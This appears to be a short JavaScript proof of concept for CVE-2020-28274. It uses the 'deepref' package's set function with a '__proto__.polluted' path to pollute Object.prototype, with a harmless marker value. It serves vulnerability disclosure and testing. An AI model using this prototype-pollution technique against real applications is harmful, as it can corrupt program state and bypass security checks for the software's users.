//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
const deepref = require("deepref");
deepref.set({}, "__proto__.polluted", "yes");
